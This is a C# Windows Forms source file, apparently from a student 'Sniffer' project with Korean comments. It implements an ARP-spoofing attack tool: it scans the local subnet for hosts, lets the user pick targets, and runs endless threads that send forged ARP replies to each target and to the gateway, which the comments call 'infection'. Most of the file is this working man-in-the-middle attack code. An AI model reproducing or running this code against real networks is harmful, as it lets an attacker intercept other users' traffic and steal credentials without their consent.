﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using System.Diagnostics;
using System.Threading;
using SharpPcap;
using PacketDotNet;
namespace Sniffer
{
    public partial class AttackList : Form
    {
        BaseInformation baseinformation;
        static Thread[] t_startHostArpSpoofing = new Thread[255];           //공격할 대상을 스푸핑한다.
        static Thread[] t_startGatewayArpSpoofing = new Thread[255];           //공격할 대상을 스푸핑한다.
        
        static Thread t_startArpScanning;           //공격할 대상을 스캐닝한다
        static bool threadState=false;
       

        public AttackList()
        {
            baseinformation = new BaseInformation();
            InitializeComponent();
            setDataGridView();
        }
     
        

        private void checkThreadState()
        {
            if (threadState == true)
            {
                btn_Start_ArpSpoof.Text = "공격 종료";
            }
            else if (threadState == false)
            {
                btn_Start_ArpSpoof.Text = "공격 시작";
            }
            // DataGridView의 컬럼 갯수를 3개로 설정합니다.
        }

        private void setDataGridView()      // DataGridView에 컬럼을 추가합니다.
        {
            dataGridView_Host_List.ColumnCount = 3;
            dataGridView_Host_List.Columns[0].Name = "Computer Name";
            dataGridView_Host_List.Columns[1].Name = "IP";
            dataGridView_Host_List.Columns[2].Name = "Mac";
            dataGridView_Attack_List.ColumnCount = 3;
            dataGridView_Attack_List.Columns[0].Name = "Computer Name";
            dataGridView_Attack_List.Columns[1].Name = "IP";
            dataGridView_Attack_List.Columns[2].Name = "Mac";  
        }


        private void SearchAllNetwork()
        {
            if (NetworkInterface.GetIsNetworkAvailable())
            {
                IPInterfaceProperties ipProps;
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (((nic.OperationalStatus == OperationalStatus.Up) && (nic.NetworkInterfaceType != NetworkInterfaceType.Tunnel)) && (nic.NetworkInterfaceType != NetworkInterfaceType.Loopback))
                    {
                        ipProps = nic.GetIPProperties();

                        byte[] addr;
                        string ip;

                        foreach (GatewayIPAddressInformation gip in ipProps.GatewayAddresses)
                        {
                            addr = gip.Address.GetAddressBytes();

                            for (int i = byte.MinValue; i <= byte.MaxValue; i++)
                            {
                                addr.SetValue((byte)i, 3);
                                ip = string.Format("{0}.{1}.{2}.{3}", addr[0], addr[1], addr[2], addr[3]);
                                string macAddress = string.Empty;
                                System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
                                pProcess.StartInfo.FileName = "arp";
                                pProcess.StartInfo.Arguments = "-a " + ip;
                                pProcess.StartInfo.UseShellExecute = false;
                                pProcess.StartInfo.RedirectStandardOutput = true;
                                pProcess.StartInfo.CreateNoWindow = true;
                                pProcess.Start();
                                string strOutput = pProcess.StandardOutput.ReadToEnd();
                                string[] substrings = strOutput.Split('-');
                                if (substrings.Length >= 8)
                                {
                                    macAddress = substrings[3].Substring(Math.Max(0, substrings[3].Length - 2))
                                             + "-" + substrings[4] + "-" + substrings[5] + "-" + substrings[6]
                                             + "-" + substrings[7] + "-"
                                             + substrings[8].Substring(0, 2);

                                    try
                                    {
                                        if (dataGridView_Host_List.InvokeRequired)
                                            dataGridView_Host_List.Invoke(new MethodInvoker(delegate
                                            {
                                                //System.Net.IPHostEntry gethostname = System.Net.Dns.GetHostByAddress(ip);
                                                dataGridView_Host_List.Rows.Add("hostname", ip, macAddress);
                                                BaseInformation.searched_IP_list.Add(ip);
                                                BaseInformation.searched_MAC_list.Add(macAddress);
                                            }));
                                        else
                                        {
                                            dataGridView_Host_List.Rows.Add("hostname", ip, macAddress);
                                            BaseInformation.searched_IP_list.Add(ip);
                                            BaseInformation.searched_MAC_list.Add(macAddress);
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        
                                    }                       
                                }
                                else
                                {
                                    //아이피에 해당하는 맥 Address가 없을 경우 여기로 옴
                                }                    
                            }
                        }
                    }
                }
            }


        }

        public void startArpSpoofingFunction()
        {
            for (int k = 0; k < BaseInformation.attack_IP_list.Count; k++)
            {
                if (k == BaseInformation.attack_IP_list.Count) return; //
                try
                {
                    t_startHostArpSpoofing[k] = new Thread(() => startHostArpSpoofing(BaseInformation.attack_IP_list[k], BaseInformation.attack_MAC_list[k]));
                    t_startHostArpSpoofing[k].Start();
                    t_startGatewayArpSpoofing[k] = new Thread(() => startGatewayArpSpoofing(BaseInformation.attack_IP_list[k], BaseInformation.attack_MAC_list[k]));
                    t_startGatewayArpSpoofing[k].Start();
                }
                catch (Exception)
                {

                }

            }
        }

        private void stopArpSpoofingFunction()
        {
            for (int i = 0; i < BaseInformation.attack_IP_list.Count; i++)
            {
                t_startHostArpSpoofing[i].Suspend();
                t_startGatewayArpSpoofing[i].Suspend();
            }    
        }

        private void btn_select_Click(object sender, EventArgs e)
        { 
            if (threadState == false)
            {
                startArpSpoofingFunction();
                threadState = true;
                btn_Start_ArpSpoof.Text = "공격 종료";
            }
            else
            {
               
                stopArpSpoofingFunction();
                threadState = false;
                btn_Start_ArpSpoof.Text = "공격 시작";
                
            }
            //
        }
        private void startHostArpSpoofing(string targetIpString, string targetMacString)
        {
            while (true)
            {
                // Millisecond 단위 이며 초기연결 지연설정

                int readTimeout = 1;


                // 현재 단말기의 네트워크 장치의 리스트들을 불러온다.


                // 무선 랜카드의 인덱스 번호는 1번(단말기 설정에 따라 다름)

                ICaptureDevice device = BaseInformation.captureDevice;


                // 무선 랜카드를 프러미스큐어스 모드로 연다.

                device.Open(DeviceMode.Promiscuous, readTimeout);


                IPAddress targetIP = null;

                IPAddress gatewayIP = null;

                PhysicalAddress targetMac = null;

                PhysicalAddress srcMac = null;

                PhysicalAddress gatewayMac = null;

                targetIP = IPAddress.Parse(targetIpString);

                targetMac = PhysicalAddress.Parse(targetMacString.ToUpper());  // 맥사이사이의 - 문자를 지워준다

                gatewayMac = PhysicalAddress.Parse(BaseInformation.gatewayMac.ToUpper());


                gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); //아이피에 게이트웨이 주소를 넣어주어야 한다.

                srcMac = PhysicalAddress.Parse(BaseInformation.myMacAddress.ToUpper());


                //타겟 Infection
                ARPPacket arp = new ARPPacket(ARPOperation.Response, targetMac, targetIP, srcMac, gatewayIP);
                EthernetPacket eth = new EthernetPacket(srcMac, targetMac, EthernetPacketType.Arp);
                eth.PayloadPacket = arp;
                device.SendPacket(eth);

                Thread.Sleep(1000);
            }
            
        }

        private void startGatewayArpSpoofing(string targetIpString, string targetMacString)
        {

            while (true)
            {
                // Millisecond 단위 이며 초기연결 지연설정
                int readTimeout = 1000;

                // 현재 단말기의 네트워크 장치의 리스트들을 불러온다.

                // 무선 랜카드의 인덱스 번호는 1번(단말기 설정에 따라 다름)
                ICaptureDevice device = BaseInformation.captureDevice;


                // 무선 랜카드를 프러미스큐어스 모드로 연다.
                device.Open(DeviceMode.Promiscuous, readTimeout);

                IPAddress targetIP = null;
                IPAddress gatewayIP = null;
                PhysicalAddress targetMac = null;
                PhysicalAddress srcMac = null;
                PhysicalAddress gatewayMac = null;
                targetIP = IPAddress.Parse(targetIpString);
                targetMac = PhysicalAddress.Parse(targetMacString.ToUpper());
                gatewayMac = PhysicalAddress.Parse(BaseInformation.gatewayMac.ToUpper());

                gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); //아이피에 게이트웨이 주소를 넣어주어야 한다.
                srcMac = PhysicalAddress.Parse(BaseInformation.myMacAddress.ToUpper());

                
                //게이트웨이 Infection
                ARPPacket arpForGateway = new ARPPacket(ARPOperation.Response, gatewayMac, gatewayIP, srcMac, targetIP);
                EthernetPacket ethforGateway = new EthernetPacket(srcMac, gatewayMac, EthernetPacketType.Arp);
                ethforGateway.PayloadPacket = arpForGateway;
                device.SendPacket(ethforGateway);


                Thread.Sleep(1000);
            }
        }

        private void btn_start_scan_Click(object sender, EventArgs e)
        {
            dataGridView_Host_List.Rows.Clear();
            baseinformation.sendArpRequest();
            t_startArpScanning = new Thread(() => SearchAllNetwork());
            t_startArpScanning.Start();
        }
        public void sendArpRequest()
        {
            int readTimeout = 1;

            // 현재 단말기의 네트워크 장치의 리스트들을 불러온다.

            // 무선 랜카드의 인덱스 번호는 1번(단말기 설정에 따라 다름)
            ICaptureDevice device = BaseInformation.captureDevice;


            // 무선 랜카드를 프러미스큐어스 모드로 연다.
            device.Open(DeviceMode.Promiscuous, readTimeout);

            IPAddress targetIP = null;
            IPAddress gatewayIP = null;
            PhysicalAddress EtherArpRequestMac = null;
            PhysicalAddress srcMac = null;
            PhysicalAddress ArpRequestMac = null;
            targetIP = IPAddress.Parse(BaseInformation.targetIpAddress);
            EtherArpRequestMac = PhysicalAddress.Parse(BaseInformation.EtherMacAddressForArpRequest.ToUpper());
            ArpRequestMac = PhysicalAddress.Parse(BaseInformation.ArpMacAddressForArpRequest.ToUpper());

            gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); //아이피에 게이트웨이 주소를 넣어주어야 한다.
            srcMac = PhysicalAddress.Parse(BaseInformation.myMacAddress.ToUpper());

            //타겟 Infection

            EthernetPacket eth = new EthernetPacket(srcMac, EtherArpRequestMac, EthernetPacketType.Arp);
            ARPPacket arp = new ARPPacket(ARPOperation.Request, ArpRequestMac, gatewayIP, srcMac, gatewayIP);


            

            eth.PayloadPacket = arp;

            device.SendPacket(eth);
        }
        private void AttackList_Load(object sender, EventArgs e)
        {
            prepareBeforeLoadList();
            checkThreadState();
        }
        private void prepareBeforeLoadList()
        {

            //
            for (int i = 0; i < BaseInformation.searched_IP_list.Count; i++)
            {
                try
                {
                    if (dataGridView_Host_List.InvokeRequired)
                        dataGridView_Host_List.Invoke(new MethodInvoker(delegate
                        {
                            //System.Net.IPHostEntry gethostname = System.Net.Dns.GetHostByAddress(ip);
                            dataGridView_Host_List.Rows.Add("hostname", BaseInformation.searched_IP_list[i], BaseInformation.searched_MAC_list[i]);

                        }));
                    else
                        dataGridView_Host_List.Rows.Add("hostname", BaseInformation.searched_IP_list[i], BaseInformation.searched_MAC_list[i]);

                }
                catch (Exception)
                {

                }
            }
            /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            for (int i = 0; i < BaseInformation.attack_IP_list.Count; i++)
            {
                try
                {
                    if (dataGridView_Attack_List.InvokeRequired)
                        dataGridView_Attack_List.Invoke(new MethodInvoker(delegate
                        {
                            //System.Net.IPHostEntry gethostname = System.Net.Dns.GetHostByAddress(ip);
                            dataGridView_Attack_List.Rows.Add("hostname", BaseInformation.attack_IP_list[i], BaseInformation.attack_MAC_list[i]);

                        }));
                    else
                        dataGridView_Attack_List.Rows.Add("hostname", BaseInformation.attack_IP_list[i], BaseInformation.attack_MAC_list[i]);

                }
                catch (Exception)
                {

                }
            }
        }
        private void btn_Move_Click(object sender, EventArgs e)
        {
            string selectedIP= this.dataGridView_Host_List.Rows[this.dataGridView_Host_List.CurrentCellAddress.Y].Cells[1].Value.ToString();
            string selectedMac = this.dataGridView_Host_List.Rows[this.dataGridView_Host_List.CurrentCellAddress.Y].Cells[2].Value.ToString();
            
            BaseInformation.attack_IP_list.Add(selectedIP);
            BaseInformation.attack_MAC_list.Add(selectedMac);

            try
            {
                if (dataGridView_Attack_List.InvokeRequired)
                    dataGridView_Attack_List.Invoke(new MethodInvoker(delegate
                    {
                        //System.Net.IPHostEntry gethostname = System.Net.Dns.GetHostByAddress(ip);
                        dataGridView_Attack_List.Rows.Add("hostname", selectedIP, selectedMac);

                    }));
                else
                    dataGridView_Attack_List.Rows.Add("hostname", selectedIP, selectedMac);

            }
            catch (Exception)
            {

            }    
        }

       
    }
}
